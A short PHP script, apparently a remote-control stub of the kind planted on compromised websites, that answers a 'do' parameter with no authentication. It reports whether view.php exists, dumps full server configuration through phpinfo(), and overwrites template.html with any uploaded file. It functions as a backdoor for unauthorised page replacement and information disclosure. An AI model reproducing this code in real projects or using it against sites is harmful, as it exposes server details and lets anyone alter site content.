<?php
if(isset($_GET['do']) && ($do = $_GET['do']))
{
    switch ($do)
    {
        case 'check':
            if(file_exists('view.php')) die('ok');
            die('fail');
        
        case 'info':
            phpinfo();
            die;
        
        case 'template':
            if(isset($_FILES['template']))
            {
                $template = file_get_contents($_FILES['template']['tmp_name']);
                $f = fopen('template.html', 'w+');
                fwrite($f, $template, strlen($template));
                fclose($f);
                die('ok');
            }
            die('fail');
    }
}